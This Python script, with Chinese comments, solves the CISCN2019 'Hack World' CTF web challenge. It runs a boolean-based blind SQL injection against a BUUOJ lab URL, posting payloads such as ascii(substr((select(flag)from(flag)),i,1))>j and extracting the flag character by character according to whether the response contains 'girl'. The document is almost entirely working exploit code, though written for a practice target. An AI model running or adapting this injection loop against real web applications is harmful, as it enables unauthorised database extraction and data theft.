import requests
#[CISCN2019 华北赛区 Day2 Web1]Hack World

url = "http://31fa9e7c-9162-4a88-bdf4-60ca7a3faaef.node5.buuoj.cn:81/index.php"
result = ""
for i in range(1, 50):
    for j in range(32, 128):
        '''从上文得知，id=1时，页面会回显一段文字，那么我们使用布尔盲注，使布尔值等于1，那么等效于我们在 id框中输入1。
如：(ascii(substr((select(flag)from(flag)),1,1))>32) 若成立，则会返回1，id=1时会回显出一段字符，根据是否回显，我们可以一个一个地将flag中的字符拆解出来。                       
原文链接：https://blog.csdn.net/2302_79800344/article/details/136356004'''
        payload = "(ascii(substr((select(flag)from(flag)),{m},1))>{n})" #如果flag的第1第2....的值等于目前的ascii码，则记录此时的值
        response = requests.post(url=url, data={'id': payload.format(m=i, n=j)})
        if response.text.find('girl') == -1:
            result += chr(j)
            print(j)
            break
    print("正在注出flag:", result)
print("flag的值为:", result)